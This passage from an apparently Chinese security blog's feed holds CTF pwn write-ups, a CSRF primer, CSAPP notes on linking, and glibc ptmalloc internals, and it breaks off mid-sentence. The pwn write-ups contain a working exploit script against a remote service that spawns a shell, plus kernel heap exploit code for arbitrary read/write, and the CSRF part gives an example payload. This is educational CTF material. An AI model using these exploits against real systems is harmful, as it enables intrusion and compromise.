'/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) success("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path)) return ELF(path) 参考:https://bbs.pediy.com/thread-225849.htm. quicksort 123456789101112131415161718192021222324252627282930313233343536from pwn import *context.log_level = 'debug'r = remote("34.92.96.238", "10000")#r = process("./quicksort")r.recvuntil("how many numbers do you want to sort?\n")r.sendline("2")i = 1r.recvuntil("the " + str(i) + "th number:")payload = "134515285" + "a" * 7 + p32(0x8048a53 + 3) + p32(0x8048a53) + p32(0x8048a53 + 3) + p32(0x804A020 - 0x8048a53 * 4 + 0x100000000)r.sendline(payload)i = 134515285r.recvuntil("the " + str(i) + "th number:")payload = "13451529" + p32(0x8048530) + p32(0x01010101) + p32(0x8048a53 + 3) + p32(0x8048a53) + p32(0x8048a53 + 3) + p32(0x804A038 - 0x8048a53 * 4 + 0x100000000) + p32(0x01010101) + p32(0x8048a5a)payload += p32(0x8048560) + p32(0x8048a5a) + p32(0x804A02C) + p32(0x01010101)#leakpayload += p32(0x8048500) + p32(0x8048a5a) + p32(0x804A034) + p32(0x804A034)#getspayload += p32(0x8048580) + p32(0x8048a5a) + p32(0x804A038)#getshell#gdb.attach(r)r.sendline(payload)r.recvuntil("the " + str(i) + "th number:")r.send("\n")libc = u32(r.recv()[:4]) - 0x5fca0r.sendline(p32(libc + 0x3ada0) + "/bin/sh\x00")r.interactive() hackme 开启KASLR,SMEP,SMAP. free时没有对size清0,write和read时偏移offset为负数可向上越界写任意长度内存. 存在竞争漏洞:全局数组pool存储内核chunk地址和chunk大小,对这个数组的存取缺少锁操作且内核以多线程启动,如果释放内存后立刻竞争读写堆块就可以造成UAF. 猜测module的第一个堆块之前是已经在使用的系统块,上面可能存在一些内核指针,从而泄露kernel_base. 通过链表读取堆地址. 123456789alloc(fd, 0, mem, 0x100)alloc(fd, 1, mem, 0x100)alloc(fd, 2, mem, 0x100)alloc(fd, 3, mem, 0x100)alloc(fd, 4, mem, 0x100)delete(fd, 1)delete(fd, 3)read_from_kernel(fd, 4, mem, 0x100, -0x100)heap_addr = *((size_t *)mem) 0号内存之前是已经在用的系统块,从0号块向前越界搜索可以发现一个内核地址0xffffffff81849ae0. 利用/proc/kallsyms可以很容易发现属于一个固定函数sysctl_table_root. 12cat /proc/kallsyms | grep ffffffff81849ae0ffffffff81849ae0 d sysctl_table_root 利用已有的内核地址,可以找到一个包含模块指针的内存位置mod_tree. 1234cat /proc/kallsyms | grep mod_treeffffffff8106df00 t __mod_tree_removeffffffff8106e720 t __mod_tree_insertffffffff81811000 d mod_tree 溢出修改fd为mod_tree后,获取内核模块hackme的基址. 1234567memset(mem, 'A', 0x100)*((size_t *)mem) = (0x811000 + kernel_addr + 0x40);write_to_kernel(fd, 4, mem, 0x100, -0x100)alloc(fd, 5, mem, 0x100)alloc(fd, 6, mem, 0x100)read_from_kernel(fd, 6, mem, 0x40, -0x40)mod_addr = *((size_t *)(mem + 0x18)) 再次劫持fd获得pool的控制权,此时已经可以任意地址读写.]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>Jeopardy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-web-CSRF-基础]]></title>
    <url>%2Fposts%2Fced35cd8%2F</url>
    <content type="text"><![CDATA[概览 Cross-Site Request Forgery跨站请求伪造. 被攻击者的浏览器被迫向目标站点发起了伪造的请求,这个过程会带上被攻击者的身份验证标识(session)以通过目标站点的验证.从而借用被攻击者在目标站点上的权限进行一系列不被期望的操作. 被攻击者登录网站之后本地存在cookie,在会话维持期间访问hack控制的网站,hack利用被攻击者的身份来做一些操作. session机制 会话是客户端与服务端间通信的一种方式.早期,客户端与服务端之间的每次信息传递都是独立的(HTTP协议是无状态的).对于无状态的HTTP协议,人们提出两种解决方案,Cookie和Session. Cookie机制. 一般来说,Cookie分发是通过扩展HTTP协议来实现的,服务器通过在HTTP的响应头中加上指示以提示浏览器生成相应的Cookie.纯粹的客户端脚本如JavaScript也可以生成Cookie. Cookie相当于由用户自己保存的一张纸,上面记载着用户的信息.比如用户名,密码等等.Cookie一般是由浏览器在后台自动发送给服务器的.浏览器会检查所有的Cookie,当某个Cookie的作用域大于或等于所要访问的资源的位置时,浏览器就会把这个Cookie附在请求资源的HTTP请求头上发送给服务器.这种方式就是客户端在维持状态. Session机制. Session相当于会员卡,上面除了Session ID什么都没有.客户端请求服务端时,服务端会检查请求中是否包含Session ID.当存在Session ID时就检索出相应的Session.不存在则创建一个Session并生成一个Session ID. Session ID的值应该是一个既不会重复,又不容易被找到规律以仿造的字符串.这种方式就是服务端在维持状态. Session机制中用户的状态由服务端来维持,但Session ID要用户自己来保管的,而一般来说,Session ID则以Cookie的形式保存在客户端. 但这种方式有一个弊端就是如果客户端禁用了Cookie,那么Session机制将无法正常工作.解决这个问题有两种方法,一种是URL重写,即将Session ID作为URL的附加信息或参数.另一种是将Session ID写在表单的隐藏域中,在表单提交时将Session ID一起提交上去. CSRF攻击 XSS:构造代码 → 伪装代码 → 发送给受害者 → 受害者打开 → 攻击者获取受害者的Cookie → 攻击者使用受害者的Cookie去干坏事 → 攻击完成. CSRF:构造代码 → 伪装代码 → 发送给受害者 → 受害者打开 → 受害者执行了恶意代码 → 攻击完成. XSS是攻击者获取到了受害者的Cookie,攻击者去执行恶意代码操作,而CSRF则是受害者在打开攻击者的代码时,攻击就已经完成了,一次CSRF攻击就完成了.简单的说,XSS是盗取Cookie,CSRF是盗用Session. payload举例:&lt;img src=http://www.a.com/admin/adduser.php?username=abc&amp;password=123&gt;. 常见漏洞类型 GET请求,且请求中没有token验证参数,还有一个固定的变量可以被控制. POST请求,且POST请求中没有token参数,也没有验证referer信息. POST请求,且POST请求中没有token参数,但是验证referer信息,可以将POST请求改写为GET请求(前提是后端没有严格的用$_POST而是用的类似于$_REQUEST的写法). CSRF的防御 检查HTTP Referer字段是否同域,但存在以下问题:只能防御来自站外的CSRF;从HTTPS站点发送请求到HTTP站点时,浏览器不发送Referer;Referer可以在服务端被伪造,即可以被向可信站点A发送请求的危险站点B伪造从而通过检查机制. 使用验证码:这种方式会降低用户的使用体验,给用户带来不便. 限制Session Cookie的生存周期:即规定如果用户在一段时间内不进行任何操作,服务端就自动销毁Session. 使用一次性Token 目前最广泛使用的解决方案.Token是一个由数字,字母组成的随机值,每次生成的Token必须具有唯一性且不易被猜测到. 在用户登录后,服务端会生成一个一次性的Token,一般Token会保存在服务端返回给用户的页面中的一个隐藏域里.每次用户向服务端发送操作请求时会附带上这个Token,服务端也会验证这个Token是否和分发给用户的Token一致,如果请求中不存在Token或Token不正确,即判定这个请求为非法请求. 这个解决方案的原理就是利用了浏览器的同源策略,即第三方无法通过AJAX等方式获取到Token值.但这种Token不具备时效性.可以使用一个临时的作用在父子页面之间的Cookie来代替Token.]]></content>
      <categories>
        <category>IS</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-NOTES-CSAPP-处理器体系结构]]></title>
    <url>%2Fposts%2Ff59edeb0%2F</url>
    <content type="text"><![CDATA[概念 CPU顺序的执行机器指令,访问存储器获取数据,同时有若干寄存器存放临时数据. 一个处理器能够处理的指令集合及其涉及的指令格式,寻址方式,操作数的定义,操作数所存放的寄存器以及存储器的相关规定就是处理器的指令体系结构(ISA). ISA在编译器编写者和处理器设计人员之间提供了一个概念抽象层.按ISA复杂程度有复杂指令集计算机(CISC,如IA-32)和精简指令集计算机(RISC,如MIPS,ARM). 程序的执行 程序运行的实质就是cpu不断读取内存中的指令对其译码并执行. cpu取出并执行一条指令的时间称为指令周期,不同指令指令周期不同,执行一条指令的过程可以分为取指,译码,执行操作(可能包括取操作数和存储结果),计算下一条指令地址. 取指:cpu根据PC(程序计数器)的值获取最长指令字节数的比特流送给IR(指令寄存器). 译码:由ID对IR中的指令操作码进行译码. 执行:有操作数则先根据寻址方式获取操作数地址从而获取源操作数或修改目的操作数(也就是访存与写回). PC更新:顺序执行时只需要让PC加当前指令长度即可,如果有转移类指令就需要计算(执行操作)得到. CPU cpu最基本的部件是数据通路和控制部件. 数据通路的作用就是传输比特流(包括数据,地址和指令). 控制部件包括ALU,通用寄存器和状态寄存器,程序计数器PC(也称为IP,指令指针寄存器),指令寄存器IR,指令译码器ID,脉冲源及启停控制逻辑(具体参考数字电路),时序信号产生部件(产生不同指令对应的时序信号),操作控制信号的形成部件,总线控制逻辑和中断机构. 中断机制 cpu从加电开始不断的执行指令(伴随PC的更改)直到遇到特殊情况无法继续执行. 非法操作码 Segmentation fault和Page fault. 运算错误,例如溢出和除零. 外部中断,一般源于IO机制. 面对这些情况cpu有专门的处理机制,称为异常处理或者中断机制.相应的逻辑称为中断机构. 流水线 流水线是基于CPU再执行一条指令时使用了不同的部分,也就是当第一条指令执行到下一阶段时,执行第二条指令的此阶段,以此类推.这样的要求就是需要流水线寄存器来储存中间过程的输出(这也是有时延的,所以流水线划分时阶段不是越多越好). 前面的方案忽略了指令之间的相互影响,而实际上指令之间存在互相影响,所以就要流水线控制逻辑来纠正这种影响带来的错误.具体待以后详细补充.]]></content>
      <categories>
        <category>CS</category>
        <category>NOTES</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-NOTES-CSAPP-链接]]></title>
    <url>%2Fposts%2F7ddf229f%2F</url>
    <content type="text"><![CDATA[概览 高级语言源程序文件转换为可执行文件通常分为预处理,编译,汇编,链接四个步骤,前三个步骤的最终结果为可重定位目标文件(GCC的.o,VC的.obj,不同编译器驱动程序大同小异). 链接是将多个文件代码和数据按照一定方式合并成一个可执行目标文件的过程,根据发生的时间段(编译时,加载时和运行时)可以分为静态链接和动态链接. 目标文件 目标文件有三种形式. 可重定位目标文件(relocatable file):包含二进制代码和数据,可以在编译时与其他重定位目标文件合并生成一个可执行目标文件. 共享目标文件(shared object file):一种特殊类型的可重定位目标文件,可以在使用其的程序加载或运行时被动态链接进内存. 可执行目标文件(executable file):包含二进制代码和数据,可以直接被加载并执行. 不同系统的目标文件格式不一定相同,最早的a.out,现代的PE,ELF,Mach-O等等.此文以ELF为例. 可重定位目标文件 .test:机器代码. .rodata:只读数据,例如常量字符串,开关语句(switch)的跳转表. .data:存放已初始化的全局和静态变量. .bss:存放未初始化的全局和静态变量,以及所有初始化为0的全局或静态变量,该节不占目标文件磁盘空间. .symtab:符号表,存放符号相关的信息,拥有全局生命周期的变量名与函数名都属于符号.(每个可重定位目标文件都有) .rel.text:存放代码的重定位条目. .rel·data:存放已初始化数据的重定位条目. .debug:调试符号表,gcc使用-g选项生成,其中包括局部变量. .line:源代码中行号和机器指令间的映射,生成方式同上. .strtab:字符串表,包含.symtab和.debug节以及节头表中引用的字符串,是以\0为结尾的字符串序列. 常见的还有以下特殊节. .comment:版本控制信息. .dynamic:动态连接信息. .dynstr:动态连接字符串. .dynsym:动态连接符号表. .got:全局偏移量表. .hash:符号哈希表. .interp:ELF程序解析器的路径名. .plt:函数连接表. .shstrtab:节名字表. 非静态局部变量是运行时由栈管理的,所以链接时不需要保存符号信息. 可执行目标文件 典型的ELF可执行文件. 32位Linux下进程空间排布示例. .init:定义了一个_init用于可执行目标文件开始执行的初始化工作. 映射过程由操作系统调用加载器函数进行(execve函数也是调用此函数).函数按照可执行文件的程序头表将可执行文件的连续的节映射到连续的内存段中并设置对应内存页的属性,内存页单位为4K,多余部分清零. 程序加载过程中并未真正映射代码和数据到物理内存,而是仅仅创建了对应的页表项(映射虚拟页).映射发生在缺页异常之后.加载器完成加载过程后会跳转到程序入口点(e_entry),也就是_start函数(定义于系统目标文件ctrl.o). 静态链接 静态链接. 12gcc -static -o test main.o test.o#等同于ld -o test main.o test.o,ld为静态链接器程序. 静态库是由多个目标模块打包而成的,可用于链接器的输入.例如Linux的存档(archive),后缀为.a. 12ar rcs lib.a test1.o test2.o#liba.a对应链接器时简写:-la 符号解析 符号表结构体. 12345678typedef struct &#123; Elf32_Word st_name;//指示符号名在字符串表中的索引,如果此值为0,那么此符号无名字. Elf32_Addr st_value;//符号的值,对应符号地址,例如可重定位目标文件中为相对节起始位置的偏移量,可执行目标文件为绝对运行时地址. Elf32_Word st_size;//对应对象的字节个数. unsigned char st_info;//低四位为符号类型,高四位为符号绑定属性. unsigned char st_other;//指示符号的可见性. Elf32_Half st_shndx;//符号所在节在节头表中的索引.&#125; Elf32_Sym; st_shndx对应的节中有三种特殊的伪节(只存在于可重定位目标文件),其在节头表中无条目.ABS代表不该被重定位的符号;UNDEF代表未定义的符号;COMMON代表未被分配位置的未初始化的数据目标,即未初始化的全局变量,其st_value给出对齐要求,size给出最小的大小. 符号解析的目的是将每一个符号(拥有全局生命周期的变量名与函数名)的引用与一个确定的符号定义建立关联. 其中函数名与已初始化的全局变量名是强符号,未初始化的全局变量名是弱符号,本地符号无强弱之分. 其中强符号只能定义一次,多个弱符号与一个强符号看强符号定义,多个弱符号则任意选择一个(对应COMMON节). 符号解析阶段,链接器按照可重定位目标文件和存档文件在命令行的顺序从左到右扫描,通过维护可重定位目标文件的集合E,未解析符号(还未与对应定义符号关联的引用符号)的集合U,已被加入到E的目标文件定义符号的集合D进行符号解析.初始三个集合为空. 链接器判断命令行中的每一个输入文件的类型. 如果是目标文件则先加入E,然后根据文件的符号引用和定义分别对U,D进行修改,然后继续下一个输入文件处理. 如果是存档文件则会尝试将U中未解析符号与该文件中各目标模块的定义符号匹配,匹配到的符号其所在的模块文件加入E,并修改U,D,循环直到集合不再改变,然后继续下一个输入文件处理. 如果处理过程中向D加入一个已存在的符号(多个强符号)或处理完所有输入文件后U非空(有符号未定义),链接器会在中途报错并停止.否则将E中所有目标文件进行重定位后合并生成可执行目标文件. 其中输入文件的顺序对链接结果是有影响的.解析完成后E中有所有需要的可重定位目标文件,D中有所有定义的符号. 重定位 可重定位目标文件的代码区和数据区都是从地址0开始的. 符号解析后每个符号引用都和一个符号定义关联,此时链接器进行重定位. 首先将所有相同类型的节合并为同一类型的新的聚合节,然后将运行时内存地址(虚拟地址)赋给新的聚合节,输入模块定义的节,输入模块定义的符号. 最后链接器根据可重定位目标文件的重定位信息修改代码节和数据节中对每个符号的引用,使得它们指向正确的运行时地址. 可重定位目标文件的.rel.text和.rel·data节中存放着需要重定位的符号的重定位信息,以结构数组的形式存储. 123456typedef struct &#123; Elf32_Addr r_offset; //需要重定位的位置与所在节起始位置的偏移量. Elf32_Word r_info; //对应符号在符号表中的索引值(高24位)以及重定位类型(低8位).&#125; Elf32_Rel; 重定位类型与处理器与系统有关,IA-32处理器有16种重定位类型,ELF定义了32种重定位类型. 最基本的有R_x86_64_PC32(引用处采用PC相对地址方式)和R_x86_64_32(引用处采用绝对地址方式). PC相对地址方式重定位值计算公式:ADDR(sym) - ((ADDR(.text) + r_offset) - r_addend).ADDR(sym)为符号sym运行时存储的地址,ADDR(.text)为.text节运行时地址,r_addend为重定位处的初始值. 绝对地址方式重定位值就是符号sym运行时地址(r_addend为0). 动态链接 共享库的代码和数据节不会被复制到可执行文件中,所有引用该库的可执行文件共享此库,在内存中一个共享库的.text节的一个副本会被不同的进程共享. 共享库是一个目标模块能在可执行文件加载或运行时被动态加载到任意内存并动态链接到此程序,此过程由动态链接器完成.Linux的共享库文件后缀为.so文件,Windows后缀为.dll. 123gcc -shared -fpic -o test.so test1.o test2.o#fpic:指生成与位置无关的代码#-shared:指生成一个共享库目标文件 静态链接生成的可执行目标文件可以在被加载后直接运行. 动态链接生成的可执行目标文件在加载时,加载器会通过一个特殊的节.interp(对应段p_type字段值为PT_INTERP)获得动态链接器路径名,动态链接器的实质也是一个共享目标(Linux的ld-linux.so),然后加载并运行这个动态链接器,再由动态链接器加载所使用的共享库文件的代码和数据段到某个内存段,完成重定位工作后将控制权交给程序. Linux系统为动态链接器提供了接口,运行应用程序在运行时加载和链接的共享库. 12345678#include &lt;dlfcn.h&gt;void * dlopen(const char * filename, int flag);//加载和链接共享库void * dlsym(void * handle, char * symbol);//获取对应共享库符号地址int dlclose(void * handle);//卸载共享库 使用以下命令行参数编译即可. 1gcc -rdynamic -o test test.c -ldl 位置无关代码 位置无关代码(PIC)指无需重定位即可加载的代码,通过gcc的-fpic编译选项生成(共享库的编译总是使用该选项). 使用这种方法,所有进程可以共享一个共享模块的代码段的单一副本(进程仍拥有自己的数据段). 实际处理过程中会使用PC相对寻址来编译这些应用,而对共享模块定义的外部过程(全局方法)和对全局变量的引用需要一些特殊的技巧. PIC数据引用 对全局变量的PIC引用基于代码段任何指令和数据段中任何变量之间的距离都是一个运行时常量(PC相对寻址). 编译器在数据段开始的地方创建了一个表,全局偏移量表(GOT).GOT中每个被本目标模块引用的全局数据目标(过程或全局变量)都有一个8(64位)字节条目.同时编译器为GOT中每个条目生成一个重定位记录,在动态链接时统一重定位,其包含目标的绝对地址,代码段可以通过相对地址获取GOT中对应的绝对地址从而达到PIC. PIC函数调用 实际上对于函数调用PIC也是通过GOT获取函数的绝对地址,但获取时间上编译器给了多种选择,一种是动态链接器加载时直接初始化GOT内容(同变量),另一种是延迟绑定,即将地址解析延缓到第一次调用此方法. 具体调用是通过两个数据结构完成的:GOT和过程链接表(PLT).任何一个外部函数都有一个自己的GOT条目和PLT条目. PLT是一个数组,每个条目是一个16字节代码.PLT[0]是一个特殊条目,其负责跳转到动态链接库中.之后就是对应的函数的条目. GOT也是一个数组,GOT[0]和GOT[1]包含动态链接器在解析地址时会用到的信息,而GOT[2]时动态链接器在ld-linux.so模块中的入口点,PLT[0]依靠这三个参数进行地址解析,之后就是对应的函数的条目,再后面就是全局变量条目.所以PLT[1]对应GOT[4]. 具体调用为以下过程. 函数调用实际上为跳转到对应的PLT条目,PLT条目中的第一条指令通过对应GOT地址进行跳转.注意如果没开延迟绑定就会直接跳转到正确的方法中运行. 而开了延迟绑定时对应GOT表初始化内容为对应PLT条目的第二条指令,即将方法对应ID压栈,跳转到PLT[0]进行地址解析并修改对应GOT表. 库打桩机制 库打桩机制是Linux链接器支持的一种用于截获对共享跨函数调用的技术. 编译时打桩,使用如下命令行编译.-I.参数告诉C预处理器首先在当前目录查找malloc.h. 12gcc -DCOMPILETIME -c mymalloc.cgcc -I. -o test test.c mymalloc.o 对应malloc.h. 123456//malloc.h#define malloc(size) mymalloc(size)#define free(ptr) myfree(ptr)void * mymalloc(size_t size)void myfree(void * ptr) 对应mymalloc.c 1234567891011#ifdef COMPILETIME#include &lt;stdio.h&gt;#include &lt;malloc.h&gt;void * mymalloc(size_t size) &#123; //code&#125;void myfree(void * ptr) &#123; //code&#125;#endif Linux静态链接器支持链接时打桩.-Wl,option将option传递给链接器(,变成空格),--wrap f告诉链接器将符号f解析为__wrap_f,把符号__real_f解析为f. 123gcc -DLINKTIME -c mymalloc.cgcc -c test.cgcc -Wl,--wrap,malloc -Wl,--wrap,free -o test test.o mymalloc.o 对应mymalloc.c 12345678910111213#ifdef LINKTIME#include &lt;stdio.h&gt;void * __real_malloc(size_t size)void __real_free(void * ptr)void * __wrap_malloc(size_t size) &#123; //code&#125;void __wrap_free(void * ptr) &#123; //code&#125;#endif 运行时打桩实际是依赖于动态链接库寻找机制,通过设置LD_PRELOAD改变加载的动态库.]]></content>
      <categories>
        <category>CS</category>
        <category>NOTES</category>
      </categories>
      <tags>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-Linux-glibc-2.23-基础]]></title>
    <url>%2Fposts%2F52ca485c%2F</url>
    <content type="text"><![CDATA[Linux动态内存分配 heap和mmap映射区域是可以运行时分配的内存空间.操作系统提供了相关的系统调用来分配内存给这两个区域. 对于heap,操作系统提供了brk()系统调用函数,C运行时库提供了sbrk()函数.对于mmap,操作系统提供了mmap()和munmap()函数. 内核对brk的实现可以看作是mmap的一个精简版,brk只是改变mm_struct结构的成员变量brk的值. 123#include &lt;unistd.h&gt;int brk(void * addr);void *sbrk(intptr_t increment); sbrk()的参数为0时,sbrk()返回的是进程的当前brk值,为正数时扩展brk值,为负值时收缩brk值. 123#include &lt;sys/mman.h&gt;void * mmap(void * addr, size_t length, int prot, int flags, int fd, off_t offset);int munmap(void * addr, size_t length); mmap()将一个文件或者其它对象映射进内存的整数页,最后一页不使用的空间清零. addr:映射区的起始地址. length:映射区的长度. prot:期望的内存保护标志,不能与文件的打开模式冲突.常用的有:PROT_EXEC,PROT_READ,PROT_WRITE,PROT_NONE(页不可访问,向系统批发一块内存进行管理时设置). fd:文件描述符.如果MAP_ANONYMOUS被设置,其值应为-1. offset:被映射对象内容的起点. flags用于指定映射选项,映射对象的类型和映射页是否可以共享. MAP_NORESERVE:不为这个映射保留交换空间.如果交换空间不被保留且内存不足,对映射区的修改会引起段违例信号.Ptmalloc向系统批发内存时设置. MAP_FIXED:如果指定的内存区重叠于现存的映射空间,重叠部分将会被丢弃.如果指定的起始地址不可用,操作将会失败.起始地址必须落在页的边界上.Ptmalloc回收系统批发的内存时设置. MAP_PRIVATE:建立一个写入时拷贝的私有映射.内存区域的写入不会影响到原文件.和MAP_FIXED互斥.Ptmalloc每次调用mmap都设置. MAP_ANONYMOUS:匿名映射,映射区不与任何文件关联.Ptmalloc每次调用mmap都设置该标志. munmap执行相反的操作,删除特定地址区域的对象映射. 内存管理方式 C风格的内存管理:通过调用brk()或mmap()系统调用实现malloc()和free()函数动态分配内存的释放.Doug Lea Malloc,ptmalloc,BSD malloc,Hoard,TCMalloc都属于这一类. 池式内存管理:内存池帮助程序进行自动内存管理,这些程序会经历一些特定的阶段,每个阶段都有特定的内存池.每次内存分配都会从指定内存池中分配内存.每个内存池都有不同的生存期限.(Apache) 引用计数:所有共享的数据结构都有一个域来包含当前结构被引用次数.计数为0则释放内存.(C++智能指针) 垃圾收集:通常会在当可用内存少于一个具体的阈值时运行垃圾收集器,尝试去追踪通过已知数据连接到每一块数据.收集器找到的都是有用的数据,没找到的就是垃圾,可以被销毁.(Java) Ptmalloc内存管理概述 ptmalloc分配器处在用户程序和内核之间,响应用户程序的分配请求,向操作系统申请内存并将其返回给用户程序.分配器会预先分配一块大于用户请求的内存,多余的为空闲空间,用户释放的内存也不会立即就返回给操作系统,分配器会管理这些空闲空间.分配器在空闲空间不足的情况下才分配新的内存. 分配区 进程可以有一个主分配区和多个非主分配区,Main_arena(主分配区)与non_main_arena(非主分配区)用环形链表进行管理.分配区利用互斥锁mutex使线程对该分配区的访问互斥. 主分配区可以访问进程的heap区域和mmap映射区域.如果主分配区的内存是通过mmap()向系统分配的,当free该内存时,主分配区会直接调用munmap()将该内存归还给系统. 而非主分配区只能访问进程的mmap映射区域,非主分配区使用mmap()向操作系统批发内存. chunk 用户请求分配的内存空间在ptmalloc中使用chunk来表示.用户请求释放的内存空间并不会马上归还系统,会先表示为空闲chunk,ptmalloc使用特定的数据结构来管理空闲chunk. ptmalloc在给用户分配的空间前后加上一些控制信息来记录分配的信息. 使用中的chunk(未free). chunk指针指向一个chunk的开始.mem指针才是真正返回给用户的指针. chunk的第二个域的最低一位为P,标识前一chunk是否在使用,为0表示前一chunk空闲,此时此chunk的prev_size有效(前一chunk的size).为1则prev_size无效.ptmalloc分配的第一个chunk总是将P设为1. chunk的第二个域的倒数第二个位为M,表示此chunk是从哪个内存区域获得的虚拟内存.为1表示是从mmap映射区域分配的,为0则是从heap区域分配的. chunk的第二个域的倒数第三个位为A,表示此chunk属于主分配区或者非主分配区,为1表示属于主分配区,为0则是非主分配区. 空闲chunk. 空闲chunk不存在M状态. 空闲chunk中原本为数据区的地方存储了两个指针,fd指向所在bin(空闲chunk容器,双向链表)的后一空闲chunk,bk指向前一空闲chunk.ptmalloc通过这两个指针将大小相近的chunk连成一个bin. 对于large bin中的空闲chunk,还有两个指针,fd_nextsize和bk_nextsize,用于加快在large bin中查找最近大小匹配的空闲chunk. 空间复用 空闲时,一个chunk至少需要4个size_t大小的空间.并且chunk的大小要对齐到8B(64位16B).使用时,其下一chunk的prev_size是无效的,这部分空间可以被当前chunk使用以达到空间复用.所以一个使用中的chunk的大小的计算公式应该是:in_use_size = (user_size + 8 - 4 ) align to 8(64位(user_size + 16 - 8 ) align to 16).向上对齐. 空闲的chunk和使用中的chunk使用的是同一块空间.所以最终的分配空间chunk_size = max(in_use_size, 16)(64位max(in_use_size, 32)).这就是ptmalloc实际需要分配的内存大小. 空闲chunk容器 ptmalloc统一管理heap和mmap映射区域中的空闲chunk,当用户进行下一次分配请求时,ptmalloc会首先试图在空闲chunk中寻找. ptmalloc将相似大小的chunk用双向链表链接起来,这样的一个链表被称为一个bin.ptmalloc一共维护了128个bin,并使用一个数组Bins来存储这些bin. Bins bins数组的第一个为unsorted bin.每个bin都是一个双向链表. 2 - 65标号的bin统称为small bins,同一small bin中的chunk大小相同.相邻small bin的chunk大小相差8bytes(64位16B).释放的chunk被插入链表头部,寻找chunk是从链表尾部开始. 之后的就是large bins.large bins中的bin分别包含给定范围内的chunk,并按大小序排列.相同大小的chunk同small bin按照最近使用顺序排列.ptmalloc使用smallest-first,best-fit原则在large bins中寻找chunk. ptmalloc将空闲chunk插入bins中时会把该chunk的下一chunk标志P设为0.同时把它和它前后的空闲chunk合并为一个chunk放到unstored bin中.ptmalloc会把一些小的chunk先放到fast bins中. bin[0]和bin[127]都不存在,bin[1]为unsorted bin的chunk链表头. Fast Bins 不大于global_max_fast的chunk被释放后会被放到fast bins中,ptmalloc不会把该chunk的下一chunk标志P设为0.要分配的chunk不大于global_max_fast时,ptmalloc会先在fast bins中查找,然后去查找bins中的空闲chunk. 在特定的时候,ptmalloc会遍历fast bins中的chunk,将相邻(内存空间)的空闲chunk进行合并,并将合并后的chunk加入unsorted bin中,然后再将unsorted bin里的chunk加入对应small bins和large bins. Fast bins可以看着是LIFO的栈,其中的bin使用单向链表实现. Unsorted Bin 释放的chunk大于global_max_fast,或者fast bins中的空闲chunk合并时,这些chunk会被放到unsorted bin队列. 在进行malloc操作的时候,如果在fast bins中没有找到合适的chunk,则ptmalloc会在unsorted bin中查找合适的空闲chunk,然后才查找small bins和large bins.如果unsorted bin不能满足分配要求.malloc便会将unsorted bin中的chunk加入对应small bins和large bins中.然后再从small bins和large bins中继续进行查找和分配. 特殊chunk 并不是所有的chunk都按照上面的方式来组织,有三种例外情况:Top chunk,Mmaped chunk和Last remainder chunk. Top chunk 在空闲内存的最高处必然存在一块空闲chunk,也就是top chunk.主分配区和非主分配区的top chunk初始化与增长方式是不一样的. 对于主分配区ptmalloc通过sbrk()来增大或是收缩进程heap的大小,初始化时brk的值等于start_brk.主分配区在第一次调用malloc时会分配(chunk_size + 128KB) align 4KB大小的空间作为初始的heap(空闲chunk),也就是初始的top chunk,然后从top chunk分配内存.初始化后如果用户程序请求时top chunk中没有空闲内存,ptmalloc会调用sbrk()将的进程heap的边界brk上移,然后修改top chunk的大小. 对于非主分配区ptmalloc会预先从mmap区域分配一块空闲内存模拟sub-heap(空闲chunk),也就是初始的top chunk,然后从top chunk分配内存.初始化后如果用户程序请求时top chunk中没有空闲内存,ptmalloc会重新分配一个sub-heap,并将top chunk迁移到新的sub-heap上,新的sub-heap与已有的sub-heap用单向链表连接起来. 与top chunk相邻的空闲chunk会在被free时与top chunk合并成新的top chunk,当该次空闲chunk大小达到某个阈值且top chunk的大小超过收缩阈值,就会执行内存收缩减小top chunk的大小(内存归还操作系统),至少保留一个页大小的空闲内存. Mmaped chunk 若分配的chunk过大,ptmalloc会使用mmap来直接使用内存映射来将页映射到进程空间.这样分配的chunk(M标志为1)在被free时将直接解除映射,将内存归还操作系统. ptmalloc对mmap threshold有一个动态调整机制.当ptmalloc munmap chunk时,如果回收的chunk空间大于mmap threshold的当前值,并且小于DEFAULT_MMAP_THRESHOLD_MAX(HEAP_MAX_SIZE / 2),ptmalloc会把mmap threshold调整为回收的chunk的大小,并将mmap收缩阈值(mmap trim threshold)设置为mmap threshold的2倍.该机制默认开启,可以用mallopt()关闭. Last remainder chunk 当需要分配small chunk,且在small bins,unsorted bin找不到合适的chunk,则通过binmaps遍历bins查找合适的chunk,如果找到则切割该chunk获取一个chunk_size大小的chunk进行分配并将剩余部分(空闲chunk)加入unsorted bin中并将其变成新的last remainder chunk. 当需要分配small chunk,且在small bins中找不到合适的chunk,如果last remainder chunk大于所需small chunk大小,last remainder chunk被分裂成两个chunk,其中一个返回给用户,另一个变成新的last remainder chunk. malloc概述 ptmalloc的响应用户内存分配要求(malloc)的具体步骤如下. 线程先获取分配区指针(其中涉及加锁和占用),无可用分配区则使用sysmalloc获取内存. 将请求大小转换为实际需要分配的大小,即chunk_size. 如果满足chunk_size &lt;= global_max_fast,则尝试在fast bins找一个所需大小的空闲chunk分配.找不到或者不满足则进行下一步. 如果所需的chunk大小属于small bins,则根据chunk_size找到所在small bin,尝试从其尾部获取一个空闲chunk分配.找不到或者大小不属于small bins则调用malloc_consolidate合并fast bin并链接到unsorted bin后进行下一步. 遍历unsorted bin,如果unsorted bin只有一个chunk(也就是last remainder chunk),而且同时满足chunk_size &lt; 512B和该chunk大小大于等于chunk_size,则直接将该chunk切割并分配.否则根据unsorted bin中chunk的大小将其放入small bins或是large bins中,进行下一步. 到这里fast bins和unsorted bin中所有的chunk都清除干净了.从large bins中按照smallest-first,best-fit原则,找一个合适的chunk,切割出所需大小的chunk进行分配并将剩余部分(空闲chunk)加入unsorted bin并将其变成新的last remainder chunk.没找到则进行下一步. 到这里就需要操作top chunk来进行分配了.判断top chunk大小是否小于chunk_size,是则从top chunk中分出一块来.否则进行下一步. 如果其他线程释放了fast bin(fast 